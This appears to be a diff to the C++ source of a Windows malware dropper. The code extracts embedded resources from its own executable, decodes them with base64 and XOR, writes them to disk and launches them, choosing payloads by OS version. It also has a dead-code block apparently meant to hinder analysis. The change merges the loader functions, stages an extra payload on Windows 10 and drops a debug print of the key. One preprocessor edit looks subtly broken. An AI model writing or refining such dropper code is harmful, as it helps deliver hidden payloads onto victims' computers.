@@ -49,8 +49,7 @@
 // Functions prototypes
 void dead();
 std::uint64_t check_version();
-void w7_dropper_start();
-void w11_dropper_start();
+void dropper_start(int);
 void drop(DWORD size, void* buffer, std::string);
 void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
@@ -133,7 +132,8 @@ int main(int argc, char* argv[])
 	else if (os_version == 6) {
 #ifdef W7_EXTRACT
 
-		w7_dropper_start();
+		dropper_start(2);
+		dropper_start(3);
 
 	#if DROPPER_BASE64 == 1
 		data2 = base64decode(data2, &size2);
@@ -164,10 +164,9 @@ int main(int argc, char* argv[])
 ////////////////////////////////////////////
 
 #else
+		dropper_start(4);
 
-		w7_dropper_start();
-
-	#if DROPPER_BASE64 == 1
+	#ifdef DROPPER_BASE64 == 1
 		data4 = base64decode(data4, &size4);
 	#endif
 
@@ -198,20 +197,29 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-		w11_dropper_start();
+		dropper_start(1);
+		dropper_start(3);
 
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
+		data3 = base64decode(data3, &size3);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
 		data1 = XOR(data1, size1);
+		data3 = XOR(data3, size3);
 	#endif
 
 		drop(size1, data1, name1);
+		drop(size3, data3, name3);
 
-		exe_launch(name1);
+		bool result = non_exe_launch(name3);
+
+		if (result == true){
+			exe_launch(name1);
+		} else {
+			std::cout << "This failed and nothing happened.\n";
+		}
 
 #ifdef DEAD_CODE
 		// dead code
@@ -365,48 +373,45 @@ void set_name(std::uint64_t os_version)
 
 }
 
-// Gets the resource from the resource section
-void w7_dropper_start(){
-#ifdef W7_EXTRACT
-	// Locate Resource
-	r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
-	r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
-	// Load Resource
-	rc2 = LoadResource(h, r2);
-	// Ensure nobody else will handle it
-	data2 = LockResource(rc2);
-	// Get embedded file size
-	size2 = SizeofResource(h, r2);
-
-	rc3 = LoadResource(h, r3);
-	// Ensure nobody else will handle it
-	data3 = LockResource(rc3);
-	// Get embedded file size
-	size3 = SizeofResource(h, r3);
-#else
-	//Locate Resource
-	r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
-	// Load Resource
-	rc4 = LoadResource(h, r4);
-	// Ensure nobody else will handle it
-	data4 = LockResource(rc4);
-	// Get embedded file size
-	size4 = SizeofResource(h, r4);
-
-#endif
-
-}
-
-// Gets the resource from the resource section
-void w11_dropper_start(){
-	// Locate Resource
-	r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
-	// Load Resource
-	rc1 = LoadResource(h, r1);
-	// Ensure nobody else will handle it
-	data1 = LockResource(rc1);
-	// Get embedded file size
-	size1 = SizeofResource(h, r1);
+void dropper_start(int x){
+	if (x == 1){
+		// Locate Resource
+		r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
+		// Load Resource
+		rc1 = LoadResource(h, r1);
+		// Ensure nobody else will handle it
+		data1 = LockResource(rc1);
+		// Get embedded file size
+		size1 = SizeofResource(h, r1);
+	}
+	if (x == 2){
+		// Locate Resource
+		r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
+		// Load Resource
+		rc2 = LoadResource(h, r2);
+		// Ensure nobody else will handle it
+		data2 = LockResource(rc2);
+		// Get embedded file size
+		size2 = SizeofResource(h, r2);
+	}
+	if (x == 3){
+		r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
+		rc3 = LoadResource(h, r3);
+		// Ensure nobody else will handle it
+		data3 = LockResource(rc3);
+		// Get embedded file size
+		size3 = SizeofResource(h, r3);
+	}
+	if (x == 4){
+		//Locate Resource
+		r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
+		// Load Resource
+		rc4 = LoadResource(h, r4);
+		// Ensure nobody else will handle it
+		data4 = LockResource(rc4);
+		// Get embedded file size
+		size4 = SizeofResource(h, r4);
+	}
 }
 
 bool non_exe_launch(std::string name){
